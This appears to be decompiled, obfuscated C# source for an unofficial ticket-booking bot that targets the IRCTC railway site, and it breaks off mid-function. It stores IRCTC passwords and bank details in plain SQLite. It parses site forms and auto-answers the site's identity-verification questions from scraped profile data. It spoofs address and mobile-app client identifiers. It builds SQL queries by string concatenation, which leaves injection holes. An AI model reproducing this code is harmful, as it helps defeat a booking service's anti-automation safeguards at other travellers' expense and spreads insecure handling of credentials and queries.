#define DEBUG
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NEXUS;

internal class clsPostData
{
	[CompilerGenerated]
	private sealed class Class43
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	internal string Accept_Language;

	public static bool ST;

	public static string ptth0;

	public static string ptth;

	internal static bool isAdmin;

	internal string[] Station_list;

	internal string[] Station_listWithDay;

	internal int frmStIndx;

	internal int int_TotalPax;

	internal Dictionary<int, string> dictionary_SRC = new Dictionary<int, string>();

	internal Dictionary<int, string> dictionary_DEST = new Dictionary<int, string>();

	internal Dictionary<int, string> dic_SwitchStation = new Dictionary<int, string>();

	internal int int_2;

	internal int int_3;

	internal int int_4;

	internal DateTime dateTime_0;

	internal DateTime dateTime_X;

	internal string currentExecutable;

	internal string Trday = "";

	internal string SRC_STN;

	internal string DEST_STN;

	internal string TRAIN_NO;

	internal string string_3;

	internal string BRD_STN;

	internal string TKT_CLASS;

	internal string TKT_QUOTA;

	internal string TKT_DAY;

	internal string TKT_MONTH;

	internal string TKT_YEAR;

	internal string J_Date;

	internal string string_11;

	internal string string_12 = "E_TICKET";

	internal bool TKT_ISADV;

	internal bool Static_ISADV;

	internal bool bool_1;

	internal bool TKT_ISBEDROLL;

	internal List<Class21> list_0;

	internal List<Class21> list_1;

	internal bool TKT_ISCONFIRM;

	internal bool TKT_ISAUTOUPGRD;

	internal string LoginType;

	internal string IRCTC_PWD;

	internal string IRCTC_ID;

	internal string string_15;

	internal string string_17;

	internal string string_18;

	internal string string_20;

	internal string TKT_TRNTYPE = "";

	internal string string_26 = "";

	internal string string_27 = "";

	internal string TKT_COACH;

	internal string TKT_PAYMENT;

	internal string Availablity_Response;

	internal string PassengerResponse;

	internal string string_33;

	internal string BANKSAVEAS = "";

	internal string BANKDETAILS = "";

	internal string string_36 = "";

	internal string string_37 = "";

	internal string TransactionID;

	internal string string_39 = "";

	internal string FAREDETAILS;

	internal string string_42;

	internal string string_43;

	internal string string_44;

	internal string string_45;

	internal string string_46;

	internal string string_47;

	internal string string_48;

	internal string string_49;

	internal string string_50;

	internal string string_51;

	internal string string_52;

	internal string string_53;

	internal string string_55;

	internal string string_57;

	internal string string_58;

	internal string _Authorization;

	internal string token;

	internal string string_61;

	internal DateTime dateTime_1 = DateTime.Now;

	internal bool bool_6;

	internal bool bool_8;

	internal bool bool_9;

	internal string Validate_Response;

	internal Dictionary<string, string> dictionary_BnkData = new Dictionary<string, string>();

	private Dictionary<string, string> dictionary_Time = new Dictionary<string, string>();

	private static Predicate<string> predicate_0;

	private static Predicate<string> predicate_1;

	private static Predicate<string> predicate_2;

	public bool bool_opening;

	public bool bool_AC_TQ;

	public bool bool_SL_TQ;

	public bool bool_13;

	public string string_64 = "https://www.irctc.co.in/eticketing/javax.faces.resource/irctc_logo_en_IN.gif.jsf?ln=images";

	public string string_65 = "https://www.irctc.co.in/eticketing/captchaImage";

	public string string_66 = "https://www.irctc.co.in/eticketing/home";

	public string string_67 = "https://www.irctc.co.in/eticketing/trainbetweenstns.jsf";

	public string string_68 = "https://www.irctc.co.in/eticketing/mainpage.jsf";

	public string string_69 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";

	public string string_70 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";

	internal string string_71 = "";

	internal string string_72;

	internal string string_74 = "";

	internal string string_75 = "";

	internal string string_76 = "";

	internal string _greq = "";

	internal string _server = "";

	internal string _Status = "";

	internal string string_78 = "";

	private string string_79;

	private string string_80;

	private string string_81;

	private string string_82;

	private string string_83;

	internal bool Status_WL;

	internal string freechamunt;

	internal bool isbhimupi;

	internal string string_111;

	internal string string_121;

	internal string string_122;

	public SQLiteConnection SQL_String11 { get; private set; }

	public string Txnamt { get; internal set; }

	[DllImport("user32.dll")]
	internal static extern void SetWindowText(IntPtr intPtr, string windowName);

	internal clsPostData()
	{
		list_0 = new List<Class21>();
		list_1 = new List<Class21>();
	}

	internal clsPostData(string string_87)
	{
		ReadDataFromDB(string_87);
	}

	internal bool method_0()
	{
		bool result = true;
		string tKT_CLASS = TKT_CLASS;
		string text = "1A";
		if (!(tKT_CLASS == text))
		{
			string tKT_CLASS2 = TKT_CLASS;
			string text2 = "EC";
			if (!(tKT_CLASS2 == text2))
			{
				string tKT_CLASS3 = TKT_CLASS;
				string text3 = "EA";
				if (!(tKT_CLASS3 == text3))
				{
					string tKT_CLASS4 = TKT_CLASS;
					string text4 = "EV";
					if (!(tKT_CLASS4 == text4))
					{
						string tKT_CLASS5 = TKT_CLASS;
						string text5 = "2A";
						if (!(tKT_CLASS5 == text5))
						{
							string tKT_CLASS6 = TKT_CLASS;
							string text6 = "3A";
							if (!(tKT_CLASS6 == text6))
							{
								string tKT_CLASS7 = TKT_CLASS;
								string text7 = "CC";
								if (!(tKT_CLASS7 == text7))
								{
									string tKT_CLASS8 = TKT_CLASS;
									string text8 = "EC";
									if (!(tKT_CLASS8 == text8))
									{
										string tKT_CLASS9 = TKT_CLASS;
										string text9 = "3E";
										if (!(tKT_CLASS9 == text9))
										{
											string text10 = TKT_QUOTA.ToUpper();
											string text11 = "GN";
											if (!(text10 == text11))
											{
												string text12 = TKT_QUOTA.ToUpper();
												string text13 = "LD";
												if (!(text12 == text13))
												{
													goto IL_01a2;
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
		result = false;
		goto IL_01a2;
		IL_01a2:
		return result;
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	internal bool ReadDataFromDB(string string_87)
	{
		bool result = false;
		try
		{
			string string_88 = "TPRMLdxJzsY=";
			string text = "VeqIYhMo7zVV9OBiRAX/SA==";
			string string_89 = text;
			string string_90 = "6$FR#9(BQ8SDVY";
			string variable = Class60.Decrypt(string_88, string_90);
			string string_91 = "6$FR#9(BQ8SDVY";
			Environment.SetEnvironmentVariable(variable, Class60.Decrypt(string_89, string_91));
			currentExecutable = AppDomain.CurrentDomain.FriendlyName.ToLower();
			DataTable dataTable = new DataTable();
			string text2 = "SELECT RID, SRC_STN,DEST_STN,BRD_STN,TRAIN_NO,TKT_DAY,TKT_MONTH,TKT_YEAR,TKT_CLASS,TKT_QUOTA,TKT_TRNTYPE,TKT_TRDAY,TKT_ISADV,TKT_ISCONFIRM,TKT_ISAUTOUPGRD,TKT_ISBEDROLL,TKT_COACH,TKT_MOBILE,TKT_IRCTCID,TKT_PWD,TKT_PAYMENT,TKT_BANKSAVEAS,TKT_BANKDETAILS,TKT_FAREDETAILS,TKT_ISRET,TKT_ISPRI,RSRC_STN,RDEST_STN,RBRD_STN,RTRAIN_NO,RTKT_DAY,RTKT_MONTH,RTKT_YEAR,RTKT_CLASS,RTKT_QUOTA,RTKT_TRNTYPE,RTKT_TRDAY FROM TBL_TKT WHERE TKT_NAME = '";
			string text3 = "'";
			new SQLiteDataAdapter(text2 + string_87 + text3, clsMain.DataBase_String).Fill(dataTable);
			if (dataTable != null && dataTable.Rows.Count > 0)
			{
				DataRow dataRow = dataTable.Rows[0];
				string columnName = "RID";
				int.Parse(dataRow[columnName].ToString());
				string columnName2 = "SRC_STN";
				SRC_STN = dataRow[columnName2].ToString();
				string columnName3 = "DEST_STN";
				DEST_STN = dataRow[columnName3].ToString();
				string columnName4 = "TRAIN_NO";
				TRAIN_NO = dataRow[columnName4].ToString();
				string columnName5 = "BRD_STN";
				BRD_STN = dataRow[columnName5].ToString();
				string columnName6 = "TKT_DAY";
				TKT_DAY = dataRow[columnName6].ToString();
				string columnName7 = "TKT_MONTH";
				TKT_MONTH = dataRow[columnName7].ToString();
				string columnName8 = "TKT_YEAR";
				TKT_YEAR = dataRow[columnName8].ToString();
				string[] array = new string[5] { TKT_DAY, null, null, null, null };
				string text4 = "/";
				array[1] = text4;
				array[2] = TKT_MONTH;
				string text5 = "/";
				array[3] = text5;
				array[4] = TKT_YEAR;
				J_Date = string.Concat(array);
				string j_Date = J_Date;
				string format = "d/M/yyyy";
				dateTime_0 = DateTime.ParseExact(j_Date, format, CultureInfo.InvariantCulture);
				dateTime_0 = new DateTime(int.Parse(TKT_YEAR), int.Parse(TKT_MONTH), int.Parse(TKT_DAY));
				string columnName9 = "TKT_CLASS";
				TKT_CLASS = dataRow[columnName9].ToString().ToUpper();
				string columnName10 = "TKT_QUOTA";
				TKT_QUOTA = dataRow[columnName10].ToString();
				string text6 = "1";
				string_11 = text6;
				string columnName11 = "TKT_TRDAY";
				string text7 = dataRow[columnName11].ToString();
				if (text7 != "")
				{
					string_11 = text7;
				}
				string columnName12 = "TKT_ISADV";
				TKT_ISADV = bool.Parse(dataRow[columnName12].ToString());
				string columnName13 = "TKT_ISBEDROLL";
				TKT_ISBEDROLL = bool.Parse(dataRow[columnName13].ToString());
				string columnName14 = "TKT_ISAUTOUPGRD";
				TKT_ISAUTOUPGRD = bool.Parse(dataRow[columnName14].ToString());
				string columnName15 = "TKT_ISCONFIRM";
				TKT_ISCONFIRM = bool.Parse(dataRow[columnName15].ToString());
				string columnName16 = "TKT_COACH";
				TKT_COACH = dataRow[columnName16].ToString();
				if (!string.IsNullOrEmpty(TKT_COACH))
				{
					string tKT_COACH = TKT_COACH;
					string value = ";";
					if (tKT_COACH.Contains(value))
					{
						string tKT_COACH2 = TKT_COACH;
						string oldValue = ";";
						TKT_COACH = tKT_COACH2.Replace(oldValue, "");
					}
				}
				string columnName17 = "TKT_MOBILE";
				string text8 = dataRow[columnName17].ToString();
				string[] array2 = new string[1];
				string text9 = "||";
				array2[0] = text9;
				string[] array3 = text8.Split(array2, StringSplitOptions.None);
				string_15 = array3[0];
				string_79 = array3[1];
				string_80 = array3[2];
				string_81 = array3[3];
				string_82 = array3[4];
				string_83 = array3[5];
				string text10 = "State Entry Rd, Railway Colony";
				string_79 = text10;
				string text11 = "110055";
				string_80 = text11;
				string text12 = "DELHI";
				string_81 = text12;
				string text13 = "Central Delhi";
				string_82 = text13;
				string text14 = "Pahar Ganj S.O";
				string_83 = text14;
				string_17 = string_87;
				string columnName18 = "TKT_IRCTCID";
				IRCTC_ID = dataRow[columnName18].ToString();
				string columnName19 = "TKT_PWD";
				IRCTC_PWD = dataRow[columnName19].ToString();
				string columnName20 = "TKT_PAYMENT";
				TKT_PAYMENT = dataRow[columnName20].ToString();
				string columnName21 = "TKT_TRNTYPE";
				TKT_TRNTYPE = dataRow[columnName21].ToString();
				string columnName22 = "TKT_BANKSAVEAS";
				BANKSAVEAS = dataRow[columnName22].ToString();
				string columnName23 = "TKT_BANKDETAILS";
				BANKDETAILS = dataRow[columnName23].ToString();
				string commandText = "SELECT BANK_SAVEAS, BANK_DETAILS FROM TBL_BANK";
				new SQLiteDataAdapter(commandText, clsMain.DataBase_String).Fill(dataTable);
				if (dataTable != null && dataTable.Rows.Count > 0)
				{
					foreach (DataRow row in dataTable.Rows)
					{
						Dictionary<string, string> dictionary = dictionary_BnkData;
						string columnName24 = "BANK_SAVEAS";
						string key = row[columnName24].ToString();
						string columnName25 = "BANK_DETAILS";
						dictionary.Add(key, row[columnName25].ToString());
					}
				}
				string columnName26 = "TKT_FAREDETAILS";
				FAREDETAILS = dataRow[columnName26].ToString();
				bool_9 = false;
				string columnName27 = "TKT_ISRET";
				string_42 = dataRow[columnName27].ToString();
				string columnName28 = "TKT_ISPRI";
				bool_8 = bool.Parse(dataRow[columnName28].ToString());
				string columnName29 = "RSRC_STN";
				string_43 = dataRow[columnName29].ToString();
				if (string_43 != "")
				{
					bool_9 = true;
				}
				string columnName30 = "RDEST_STN";
				string_44 = dataRow[columnName30].ToString();
				string columnName31 = "RTRAIN_NO";
				string_45 = dataRow[columnName31].ToString();
				string columnName32 = "RBRD_STN";
				string_46 = dataRow[columnName32].ToString();
				string columnName33 = "RTKT_DAY";
				string_47 = dataRow[columnName33].ToString();
				string columnName34 = "RTKT_MONTH";
				string_48 = dataRow[columnName34].ToString();
				string columnName35 = "RTKT_YEAR";
				string_49 = dataRow[columnName35].ToString();
				string columnName36 = "RTKT_CLASS";
				string_50 = dataRow[columnName36].ToString();
				string columnName37 = "RTKT_QUOTA";
				string_51 = dataRow[columnName37].ToString();
				string columnName38 = "RTKT_TRNTYPE";
				string_52 = dataRow[columnName38].ToString();
				string columnName39 = "RTKT_TRDAY";
				string_53 = dataRow[columnName39].ToString();
				string_20 = SRC_STN + DEST_STN + TRAIN_NO + TKT_CLASS + J_Date;
				bool_6 = false;
				string text15 = "";
				list_0 = new List<Class21>();
				list_1 = new List<Class21>();
				dataTable.Dispose();
				dataTable = new DataTable();
				string text16 = "SELECT PAX_NAME,PAX_AGE,PAX_SEX,PAX_BIRTH,PAX_FOOD,PAX_IDTYPE,PAX_IDNO,PAX_CONC FROM TBL_PAX WHERE TKT_ID = '";
				string text17 = "'";
				new SQLiteDataAdapter(text16 + string_87 + text17, clsMain.DataBase_String).Fill(dataTable);
				foreach (DataRow row2 in dataTable.Rows)
				{
					string columnName40 = "PAX_BIRTH";
					if (row2[columnName40] != null)
					{
						string columnName41 = "PAX_BIRTH";
						if (row2[columnName41].GetType() != typeof(DBNull))
						{
							string columnName42 = "PAX_BIRTH";
							if (!string.IsNullOrEmpty(row2[columnName42].ToString()))
							{
								int_TotalPax++;
								Class21 @class = new Class21();
								string text18 = text15;
								string columnName43 = "PAX_NAME";
								text15 = text18 + row2[columnName43].ToString();
								if (int_TotalPax == 1)
								{
									string text19 = string_20;
									string columnName44 = "PAX_NAME";
									string_20 = text19 + row2[columnName44].ToString();
								}
								string columnName45 = "PAX_NAME";
								@class.string_0 = row2[columnName45].ToString();
								string columnName46 = "PAX_AGE";
								@class.string_1 = row2[columnName46].ToString();
								string columnName47 = "PAX_SEX";
								@class.string_2 = row2[columnName47].ToString();
								string columnName48 = "PAX_BIRTH";
								@class.string_3 = row2[columnName48].ToString();
								string columnName49 = "PAX_FOOD";
								@class.string_5 = row2[columnName49].ToString();
								string columnName50 = "PAX_IDTYPE";
								@class.string_6 = row2[columnName50].ToString();
								string columnName51 = "PAX_IDNO";
								@class.string_7 = row2[columnName51].ToString();
								string columnName52 = "PAX_CONC";
								@class.string_4 = row2[columnName52].ToString();
								list_0.Add(@class);
								continue;
							}
						}
					}
					Class21 class2 = new Class21();
					string columnName53 = "PAX_NAME";
					class2.string_0 = row2[columnName53].ToString();
					string columnName54 = "PAX_AGE";
					class2.string_1 = row2[columnName54].ToString();
					string columnName55 = "PAX_SEX";
					class2.string_2 = row2[columnName55].ToString();
					list_1.Add(class2);
				}
				dateTime_1 = new DateTime(int.Parse(TKT_YEAR), int.Parse(TKT_MONTH), int.Parse(TKT_DAY));
				string_18 = SRC_STN + DEST_STN + TRAIN_NO + TKT_DAY + TKT_MONTH + TKT_YEAR + TKT_CLASS + text15;
				string_18 = string_18.Trim();
				result = true;
				return true;
			}
			string text20 = "Ticket Not Found!";
			MessageBox.Show(text20);
			return result;
		}
		catch (Exception)
		{
			string text21 = "Ticket Reading Failed!";
			MessageBox.Show(text21);
			return result;
		}
	}

	public string Method_SerialInp_pho(string A_0, ref string A_1, bool A_2)
	{
		string strAction = A_1;
		string htmlSerialInpp = GetHtmlSerialInpp(A_0, ref strAction);
		A_1 = strAction;
		string text = A_1;
		string oldValue = "&amp;";
		string newValue = "&";
		A_1 = text.Replace(oldValue, newValue);
		return htmlSerialInpp;
	}

	public static string GetHtmlSerialInpp(string strHtm, ref string strAction)
	{
		string text = "";
		try
		{
			string oldValue = "'";
			string newValue = "\"";
			string text2 = strHtm.Replace(oldValue, newValue);
			string value = "<form";
			int num = text2.IndexOf(value, StringComparison.CurrentCultureIgnoreCase);
			if (num < 0)
			{
				string value2 = "http://";
				if (text2.IndexOf(value2) != 0)
				{
					string value3 = "https://";
					if (text2.IndexOf(value3) != 0)
					{
						goto IL_055b;
					}
				}
				strAction = text2;
				goto IL_055b;
			}
			try
			{
				string value4 = " action";
				int startIndex = text2.IndexOf(value4, num, StringComparison.CurrentCultureIgnoreCase);
				string value5 = "=";
				startIndex = text2.IndexOf(value5, startIndex, StringComparison.CurrentCultureIgnoreCase);
				string value6 = "\"";
				startIndex = text2.IndexOf(value6, startIndex) + 1;
				string value7 = "\"";
				int num2 = text2.IndexOf(value7, startIndex);
				strAction = text2.Substring(startIndex, num2 - startIndex);
				string text3 = strAction;
				string oldValue2 = "&amp;";
				string newValue2 = "&";
				strAction = text3.Replace(oldValue2, newValue2);
			}
			catch
			{
			}
			string value8 = "<form";
			num = text2.IndexOf(value8, StringComparison.CurrentCultureIgnoreCase);
			string value9 = "</form";
			int num3 = text2.IndexOf(value9, StringComparison.CurrentCultureIgnoreCase);
			while (num > -1)
			{
				string text4 = "";
				string value10 = "<input";
				int num4 = text2.IndexOf(value10, num, StringComparison.CurrentCultureIgnoreCase);
				string value11 = "<select";
				int num5 = text2.IndexOf(value11, num, StringComparison.CurrentCultureIgnoreCase);
				int num6 = -1;
				if (num4 == -1 && num5 == -1 && num6 == -1)
				{
					break;
				}
				int num7 = num4;
				int[] array = new int[3] { num4, num5, num6 };
				for (int i = 1; i < array.Length; i++)
				{
					if (num7 > array[i] && array[i] != -1)
					{
						num7 = array[i];
					}
				}
				if (num7 == num4)
				{
					num = num4;
					string text5 = "input";
					text4 = text5;
				}
				else if (num7 != num5)
				{
					if (num7 == num6)
					{
						num = num6;
						text4 = "";
					}
				}
				else
				{
					num = num5;
					string text6 = "select";
					text4 = text6;
				}
				string text7 = "<";
				num = text2.IndexOf(text7 + text4, num, StringComparison.CurrentCultureIgnoreCase);
				if (num < num3)
				{
					string value12 = "<input";
					num = text2.IndexOf(value12, num, StringComparison.CurrentCultureIgnoreCase);
					string value13 = ">";
					int num8 = text2.IndexOf(value13, num) + 1;
					string text8 = text2.Substring(num, num8 - num);
					string text9 = text8;
					string oldValue3 = "\t";
					string text10 = text9.Replace(oldValue3, "");
					string oldValue4 = "\n";
					string text11 = text10.Replace(oldValue4, "");
					string oldValue5 = "\r";
					string newValue3 = " ";
					text8 = text11.Replace(oldValue5, newValue3);
					num = num8;
					string text12 = text8;
					string value14 = "type=\"submit\"";
					if (text12.Contains(value14))
					{
						continue;
					}
					string text13 = text8;
					string value15 = " name=";
					int num9 = text13.IndexOf(value15, StringComparison.CurrentCultureIgnoreCase);
					if (num9 == -1)
					{
						string text14 = text8;
						string value16 = " name";
						num9 = text14.IndexOf(value16, StringComparison.CurrentCultureIgnoreCase);
						if (num9 == -1)
						{
							continue;
						}
					}
					string text15 = text8;
					string value17 = "\"";
					num9 = text15.IndexOf(value17, num9) + 1;
					string text16 = text8;
					string value18 = "\"";
					int num10 = text16.IndexOf(value18, num9);
					string text17 = text8.Substring(num9, num10 - num9);
					string text18 = text8;
					string value19 = " value=";
					num9 = text18.IndexOf(value19, StringComparison.CurrentCultureIgnoreCase);
					if (num9 == -1)
					{
						string text19 = text8;
						string value20 = " value";
						num9 = text19.IndexOf(value20, StringComparison.CurrentCultureIgnoreCase);
						if (num9 == -1)
						{
							continue;
						}
					}
					string text20 = "";
					if (num9 > -1)
					{
						string text21 = text8;
						string value21 = "\"";
						if (text21.IndexOf(value21, num9) <= -1)
						{
							string text22 = text8;
							string value22 = "'";
							if (text22.IndexOf(value22, num9) > -1)
							{
								string text23 = text8;
								string value23 = "'";
								num9 = text23.IndexOf(value23, num9) + 1;
								string text24 = text8;
								string value24 = "'";
								num10 = text24.IndexOf(value24, num9);
							}
							else
							{
								num9 += 7;
								string text25 = text8;
								string value25 = ">";
								num10 = text25.IndexOf(value25, num9);
							}
						}
						else
						{
							string text26 = text8;
							string value26 = "\"";
							num9 = text26.IndexOf(value26, num9) + 1;
							string text27 = text8;
							string value27 = "\"";
							num10 = text27.IndexOf(value27, num9);
						}
						string text28 = text8.Substring(num9, num10 - num9);
						string oldValue6 = "&amp;";
						string newValue4 = "&";
						text20 = HttpUtility.UrlEncode(text28.Replace(oldValue6, newValue4));
					}
					string text29 = text17;
					string text30 = "=";
					text17 = text29 + text30 + text20;
					string text33;
					if (!string.IsNullOrEmpty(text))
					{
						string text31 = text;
						string text32 = "&";
						text33 = text31 + text32 + text17;
					}
					else
					{
						text33 = text17;
					}
					text = text33;
					continue;
				}
				return text;
			}
			goto end_IL_0007;
			IL_055b:
			return text;
			end_IL_0007:;
		}
		catch
		{
		}
		return text;
	}

	internal string method_2(string string_87)
	{
		string result = "";
		try
		{
			DataTable dataTable = new DataTable();
			string text = "SELECT UserState FROM TBL_USER WHERE UserName = '";
			string text2 = "'";
			new SQLiteDataAdapter(text + string_87 + text2, clsMain.DataBase_String).Fill(dataTable);
			foreach (DataRow row in dataTable.Rows)
			{
				string text3 = row[0].ToString();
				string[] array = new string[1];
				string text4 = "||";
				array[0] = text4;
				result = text3.Split(array, StringSplitOptions.None)[1];
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private string method_3(string string_87)
	{
		string text = "";
		try
		{
			string value = "registered Mobile Number";
			if (string_87.Contains(value))
			{
				string value2 = "missing digits of";
				if (string_87.Contains(value2))
				{
					string text2 = "Mobile Number ";
					string value3 = text2;
					string text3 = string_87.Substring(string_87.IndexOf(value3) + 14);
					string text4 = text3;
					string text5 = text3;
					string value4 = " ";
					text3 = text4.Substring(0, text5.IndexOf(value4));
					char[] array = text3.ToCharArray();
					string validate_Response = Validate_Response;
					string string_88 = "mobile";
					char[] array2 = method_13(validate_Response, string_88).ToCharArray();
					for (int i = 0; i < 10; i++)
					{
						string text6 = array[i].ToString();
						string text7 = "X";
						if (text6 == text7)
						{
							string text8 = array2[i].ToString();
							text += text8;
						}
					}
				}
				return text;
			}
			string value5 = "registered UserLoginID";
			if (string_87.Contains(value5))
			{
				string iRCTC_ID = IRCTC_ID;
				string value6 = "Is it Your";
				if (!(string_87.Contains(value6) & string_87.Contains(iRCTC_ID)))
				{
					string text9 = "N";
					text = text9;
					return text;
				}
				string text10 = "Y";
				text = text10;
				return text;
			}
			string value7 = "registered DOB";
			bool flag = string_87.Contains(value7);
			string value8 = "registered Dob";
			if (flag | string_87.Contains(value8))
			{
				string value9 = "";
				try
				{
					string validate_Response2 = Validate_Response;
					string string_89 = "dob";
					string text11 = method_13(validate_Response2, string_89);
					if (text11 != "")
					{
						string format = "dd-MM-yyyy";
						DateTime dateTime = DateTime.ParseExact(text11, format, CultureInfo.InvariantCulture);
						string text12 = "dd-MMM-yyyy";
						value9 = dateTime.ToString(text12, CultureInfo.InvariantCulture);
					}
				}
				catch
				{
				}
				string value10 = "Is it Your";
				if (string_87.Contains(value10) & string_87.Contains(value9))
				{
					string text13 = "Y";
					text = text13;
					return text;
				}
				string text14 = "N";
				text = text14;
				return text;
			}
			string value11 = "registered EMAIL";
			bool flag2 = string_87.Contains(value11);
			string value12 = "registered Email";
			if (flag2 | string_87.Contains(value12))
			{
				string validate_Response3 = Validate_Response;
				string string_90 = "email";
				string value13 = method_13(validate_Response3, string_90);
				string value14 = "Is it Your";
				if (string_87.Contains(value14) & string_87.Contains(value13))
				{
					string text15 = "Y";
					text = text15;
					return text;
				}
				string text16 = "N";
				text = text16;
				return text;
			}
			string value15 = "registered PIN";
			bool flag3 = string_87.Contains(value15);
			string value16 = "registered Pin";
			if (!(flag3 | string_87.Contains(value16)))
			{
				string value17 = "your register mobile number";
				if (string_87.Contains(value17))
				{
					string validate_Response4 = Validate_Response;
					string string_91 = "mobile";
					text = method_13(validate_Response4, string_91);
					return text;
				}
				string value18 = "your register email ID";
				if (string_87.Contains(value18))
				{
					string validate_Response5 = Validate_Response;
					string string_92 = "email";
					text = method_13(validate_Response5, string_92);
					return text;
				}
				string value19 = "your register user login id";
				if (!string_87.Contains(value19))
				{
					string value20 = "your register date of birth in ddMMyyyy format";
					if (string_87.Contains(value20))
					{
						string text17 = "";
						try
						{
							string validate_Response6 = Validate_Response;
							string string_93 = "dob";
							string text18 = method_13(validate_Response6, string_93);
							if (text18 != "")
							{
								string format2 = "dd-MM-yyyy";
								DateTime dateTime2 = DateTime.ParseExact(text18, format2, CultureInfo.InvariantCulture);
								string text19 = "dd-MM-yyyy";
								text17 = dateTime2.ToString(text19, CultureInfo.InvariantCulture);
							}
						}
						catch
						{
						}
						string text20 = text17;
						string oldValue = "-";
						text = text20.Replace(oldValue, "");
						return text;
					}
					string value21 = "You registered for IRCTC Ewallet Feature";
					if (string_87.Contains(value21))
					{
						string text21 = "0";
						text = text21;
						return text;
					}
					string value22 = "You give Feedback after Ticket Booking";
					if (string_87.Contains(value22))
					{
						string text22 = "N";
						text = text22;
						return text;
					}
					string text23 = "N";
					text = text23;
					return text;
				}
				text = IRCTC_ID;
				return text;
			}
			string validate_Response7 = Validate_Response;
			string string_94 = "pinCode";
			method_13(validate_Response7, string_94);
			string value23 = "Is it Your";
			if (string_87.Contains(value23))
			{
				string text24 = "Y";
				text = text24;
				return text;
			}
			string text25 = "N";
			text = text25;
			return text;
		}
		catch (Exception ex)
		{
			string text26 = "Here Paxs Data' Ques/Ans Some Occure. ";
			MessageBox.Show(text26 + ex.Message.ToString());
			return text;
		}
	}

	internal void method_4(bool bool_14, string string_87, string string_88, string string_89, string string_90)
	{
		SQLiteConnection sQLiteConnection = new SQLiteConnection(clsMain.DataBase_String);
		sQLiteConnection.Open();
		try
		{
			SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
			DateTime now = DateTime.Now;
			string text = "ddmmyy";
			string text2 = string_90 + now.ToString(text);
			if (!bool_14)
			{
				string[] array = new string[7];
				string text3 = "UPDATE tbl_TktHistory set PNR = '";
				array[0] = text3;
				array[1] = string_89;
				string text4 = "', Remarks = '";
				array[2] = text4;
				array[3] = string_87;
				string text5 = "' WHERE TCNTRL_NAME = '";
				array[4] = text5;
				array[5] = text2;
				string text6 = "';";
				array[6] = text6;
				sQLiteCommand.CommandText = string.Concat(array);
				sQLiteCommand.ExecuteNonQuery();
			}
			else
			{
				string[] array2 = new string[21];
				string text7 = "INSERT INTO TBL_HISTORY(TCNTRL_NAME, TKT_NAME, IRCTC_ID, stnFrom, stnTo, Journey_Date, BANK_NAME, AMT, PNR, Remarks, Create_Date) VALUES('";
				array2[0] = text7;
				array2[1] = text2;
				string text8 = "', '";
				array2[2] = text8;
				array2[3] = string_17;
				string text9 = "', '";
				array2[4] = text9;
				array2[5] = IRCTC_ID;
				string text10 = "', '";
				array2[6] = text10;
				array2[7] = SRC_STN;
				string text11 = "', '";
				array2[8] = text11;
				array2[9] = DEST_STN;
				string text12 = "', '";
				array2[10] = text12;
				array2[11] = J_Date;
				string text13 = "', '";
				array2[12] = text13;
				array2[13] = BANKSAVEAS;
				string text14 = "', '";
				array2[14] = text14;
				array2[15] = string_88;
				string text15 = "', '";
				array2[16] = text15;
				array2[17] = string_89;
				string text16 = "', '";
				array2[18] = text16;
				array2[19] = string_87;
				string text17 = "', date('now'));";
				array2[20] = text17;
				sQLiteCommand.CommandText = string.Concat(array2);
				sQLiteCommand.ExecuteNonQuery();
			}
			string[] array3 = new string[5];
			string text18 = "UPDATE [TBL_USER] SET [UserState] = 'Book||";
			array3[0] = text18;
			now = DateTime.Now.Date;
			string text19 = "dd/M/yyyy";
			array3[1] = now.ToString(text19);
			string text20 = "' WHERE [UserName] = '";
			array3[2] = text20;
			array3[3] = IRCTC_ID;
			string text21 = "'";
			array3[4] = text21;
			sQLiteCommand.CommandText = string.Concat(array3);
			sQLiteCommand.ExecuteNonQuery();
		}
		catch
		{
		}
		finally
		{
			if (sQLiteConnection.State == ConnectionState.Open)
			{
				sQLiteConnection.Close();
			}
		}
	}

	private string method_5(int int_5, string string_87)
	{
		Random random_0 = new Random();
		return new string((from string_0 in Enumerable.Repeat(string_87, int_5)
			select string_0[random_0.Next(string_0.Length)]).ToArray());
	}

	public string method_6()
	{
		string string_ = "0123456789";
		string text = method_5(15, string_);
		DateTime now = DateAndTime.Now;
		string text2 = "yyyyMMddHHmmss";
		string s = now.ToString(text2) + IRCTC_ID + text;
		byte[] bytes = new ASCIIEncoding().GetBytes(s);
		byte[] array = new MD5CryptoServiceProvider().ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			ref byte reference = ref array[i];
			string text3 = "x2";
			stringBuilder.Append(reference.ToString(text3));
		}
		return stringBuilder.ToString().Substring(0, 8);
	}

	public static string ComputeClientTransactionId(string androidId, string deviceValue, DateTime? when = null)
	{
		DateTime dateTime = when ?? DateTime.Now;
		string text = "yyyyMMddHHmmss";
		string text2 = dateTime.ToString(text, CultureInfo.InvariantCulture);
		string s = (androidId ?? string.Empty) + (deviceValue ?? string.Empty) + text2;
		byte[] bytes = Encoding.UTF8.GetBytes(text2);
		byte[] bytes2 = Encoding.UTF8.GetBytes(s);
		byte[] array = new byte[bytes.Length + bytes2.Length];
		Buffer.BlockCopy(bytes, 0, array, 0, bytes.Length);
		Buffer.BlockCopy(bytes2, 0, array, bytes.Length, bytes2.Length);
		byte[] source;
		using (SHA256 sHA = SHA256.Create())
		{
			source = sHA.ComputeHash(array);
		}
		string text4 = string.Concat(source.Select(delegate(byte b)
		{
			string text3 = "x2";
			return b.ToString(text3);
		}));
		text4 = text4.TrimStart('0');
		if (text4.Length == 0)
		{
			string text5 = "0";
			text4 = text5;
		}
		if (text4.Length < 8)
		{
			text4 = text4.PadRight(8, '0');
		}
